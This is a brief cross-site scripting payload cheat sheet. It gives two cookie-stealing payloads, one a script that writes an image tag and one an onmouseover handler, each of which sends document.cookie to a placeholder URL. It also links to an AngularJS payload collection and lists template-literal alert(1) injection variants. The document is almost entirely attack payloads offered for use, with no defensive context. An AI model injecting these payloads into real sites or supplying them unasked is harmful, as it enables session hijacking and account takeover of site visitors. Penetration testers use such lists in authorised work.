# Steal Cookies
## Basic
```javascript
<script>document.write('<img src="[URL]?c='+document.cookie+'"/>'); </script>
```

## Onmouseover
```javascript
onmouseover=eval(var i=new Image;i.src="[URL]/?"+document.cookie;)
```

# AngularJS
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md

# Template Literal Payloads
```javascript
alert(1)
${alert(1)}
alert(1);
${alert(1)};
`alert(1)`
`${alert(1)}`
`${alert(1)}`;
alert(1);
${alert(1)}/*
```
